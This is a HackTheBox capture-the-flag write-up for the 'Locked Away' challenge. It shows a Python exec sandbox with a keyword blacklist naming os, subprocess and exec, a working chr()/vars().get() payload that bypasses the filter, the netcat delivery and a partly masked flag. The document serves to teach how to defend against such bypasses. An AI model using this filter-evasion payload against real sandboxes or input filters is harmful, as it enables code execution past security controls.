<div align="center">

# Locked Away — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-N%2FA-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Locked Away |
| IP | `<CHALLENGE_IP>` |
| OS | N/A |
| Difficulty | Easy |
| Category | Misc |
| Port | 32011 |
| Points | 975 |

## Table of Contents

1. [Description](#description)
2. [Analysis](#analysis)
3. [Vulnerability](#vulnerability)
4. [Exploitation](#exploitation)
5. [Payload Delivery](#payload-delivery)
6. [Key Takeaways](#key-takeaways)
7. [Tools Used](#tools-used)
8. [References](#references)
9. [Flags](#flags)

---

## Description

A test! Getting onto the team is one thing, but you must prove your skills to be chosen to represent the best of the best. They have given you the classic - a restricted environment, devoid of functionality, and it is up to you to see what you can do. Can you break open the chest?

---

## Analysis

The challenge provided a restricted Python interpreter running via a socket server. The `main.py` contained the following security controls:

```python
blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'flag', 'txt', 'read', 'eval', 'exec',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', "'", 'open'
]

while True:
    command = input('The chest lies waiting... ')
    if any(b in command for b in blacklist):
        print('Invalid command!')
        continue
    try:
        exec(command)
    except Exception:
        print('You have been locked away...')
        exit(1337)
```

The `open_chest()` function was available in the global scope to read the flag, but the string "open" was blacklisted.

---

## Vulnerability

**Type:** Python Sandbox Escape via Character Code Construction

The blacklist blocked direct access to `open_chest()` and common bypass techniques like string concatenation with quotes. However, Python's `chr()` function and dictionary methods were not blocked.

---

## Exploitation

**Bypass Technique:** Use `chr()` to dynamically construct the string "open_chest" from ASCII codes, bypassing the string literal blacklist.

```python
# chr(111) = 'o'
# chr(112) = 'p' 
# chr(101) = 'e'
# chr(110) = 'n'
# chr(95)  = '_'
# chr(99)  = 'c'
# chr(104) = 'h'
# chr(115) = 's'
# chr(116) = 't'

vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
```

**Why it works:**
- `vars()` returns the current scope's dictionary
- `.get()` retrieves the function without using square brackets (which are blocked)
- `chr()` constructs the function name without using quotes
- `()` executes the retrieved function

---

## Payload Delivery

```bash
nc <CHALLENGE_IP> 32011
```

```text
[banner displayed]
The chest lies waiting... vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}
```

---

## Key Takeaways

1. **Character code construction** (`chr()`) is a powerful bypass for string-based blacklists
2. **Dictionary methods** (`.get()`) can bypass bracket-based filtering
3. Python's introspection functions (`vars()`, `locals()`, `globals()`) provide multiple paths to access objects
4. Blacklists are often incomplete - always look for alternative ways to achieve the same goal

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nc (netcat) | TCP connection to target |
| chr() | Python built-in for character code construction |
| vars() | Python built-in for scope introspection |

---

## References

- [Python chr() Function](https://docs.python.org/3/library/functions.html#chr)
- [Python vars() Function](https://docs.python.org/3/library/functions.html#vars)

---

## Flags

| Flag | Value |
|------|-------|
| Challenge | `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Locked Away*

</div>
